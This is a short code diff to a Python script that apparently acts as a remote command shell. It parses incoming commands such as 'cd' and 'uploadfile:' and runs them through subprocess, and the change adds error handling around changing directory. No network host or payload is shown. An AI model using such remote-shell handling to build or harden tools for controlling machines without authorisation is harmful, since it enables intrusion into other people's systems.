@@ -43,7 +43,10 @@ while True:
             #print(tokens[0])
             if tokens[0] == 'cd' :
                 if len(tokens) > 1 :
-                    os.chdir(tokens[1])
+                    try:
+                        os.chdir(tokens[1])
+                    except:
+                        res = subprocess.getoutput("")
                 else :
                     res = subprocess.getoutput("echo 'EROR : cd to wher ??'")
             if tokens[0] == 'uploadfile:' :
